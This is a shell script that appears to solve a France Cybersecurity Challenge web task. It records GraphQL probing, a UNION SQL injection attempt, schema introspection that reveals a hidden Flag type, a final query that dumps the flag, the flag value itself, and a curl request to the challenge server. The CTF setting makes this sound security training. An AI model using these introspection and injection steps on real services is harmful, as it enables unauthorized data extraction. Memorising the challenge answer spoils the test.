#!/bin/sh

#SEARCH='{ allCooks (filter: { firstname: {like: "%"}}) { nodes { firstname, lastname, speciality, price }}}'


SEARCH='{ version }'
# {"errors":[{"message":"Cannot query field \"version\" on type \"Query\".","locations":[{"line":1,"column":3}]}]}

SEARCH='{ allCooks }'
# {"errors":[{"message":"Field \"allCooks\" of type \"CooksConnection\" must have a selection of subfields. Did you mean \"allCooks { ... }\"?","locations":[{"line":1,"column":3}]}]}

SEARCH='{ allCooks { nodes } }'
# {"errors":[{"message":"Field \"nodes\" of type \"[Cook]!\" must have a selection of subfields. Did you mean \"nodes { ... }\"?","locations":[{"line":1,"column":14}]}]}

SEARCH='{ allCooks (filter: { firstname: {like: "%hib%"}}) { nodes { firstname }} }'
# {"data":{"allCooks":{"nodes":[{"firstname":"Thibault"}]}}}

SEARCH='{ allCooks (filter: { firstname: {like: "%" UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 WHERE "1" != "%"}}) { nodes { firstname }} }'
# {"errors":[{"message":"Syntax Error: Expected :, found Name \"SELECT\"","locations":[{"line":1,"column":51}]}]}


SEARCH='{ flag }'
# {"errors":[{"message":"Field \"flag\" of type \"Flag\" must have a selection of subfields. Did you mean \"flag { ... }\"?","locations":[{"line":1,"column":3}]},{"message":"Field \"flag\" argument \"nodeId\" of type \"ID!\" is required, but it was not provided.","locations":[{"line":1,"column":3}]}]

SEARCH='{ __schema { types { name}} }'
# {"data":{"__schema":{"types":[{"name":"Query"},{"name":"Node"},{"name":"ID"},{"name":"Int"},{"name":"Cursor"},{"name":"CooksOrderBy"},{"name":"CookCondition"},{"name":"String"},{"name":"CookFilter"},{"name":"IntFilter"},{"name":"Boolean"},{"name":"StringFilter"},{"name":"CooksConnection"},{"name":"Cook"},{"name":"CooksEdge"},{"name":"PageInfo"},{"name":"FlagsOrderBy"},{"name":"FlagCondition"},{"name":"FlagFilter"},{"name":"FlagsConnection"},{"name":"Flag"},{"name":"FlagsEdge"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}

SEARCH='{ __type(name: "Flag") { name fields {name type { name kind }}}}'
# {"data":{"__type":{"name":"Flag","fields":[{"name":"nodeId","type":{"name":null,"kind":"NON_NULL"}},{"name":"id","type":{"name":null,"kind":"NON_NULL"}},{"name":"flag","type":{"name":"String","kind":"SCALAR"}}]}}

SEARCH='{ __type(name: "Query") { name fields {name type { name kind }}}}'
#SEARCH='{ nodeId }' # query
#SEARCH='{ __type(name:"Cook") { name fields {name type { name kind }}}}'
#SEARCH='{ node(nodeId:"query") {} }' # query

SEARCH='{ allFlags { nodes { flag } }}'
cat << EOF
{
  "data": {
    "allFlags": {
      "nodes": [
        {
          "flag": "FCSC{1ef3c5c3ac3c56eb178bafea15b07b82c4a0ea8184d76a722337dca108add41a}"
        }
      ]
    }
  }
}

EOF

curl 'http://challenges2.france-cybersecurity-challenge.fr:5006/index.php?search='"$(echo "$SEARCH" | base64 -w0| tr -d =| tr +/ -_)" -H 'Connection: keep-alive' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://challenges2.france-cybersecurity-challenge.fr:5006/' -H 'Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,fr;q=0.7' --compressed --insecure
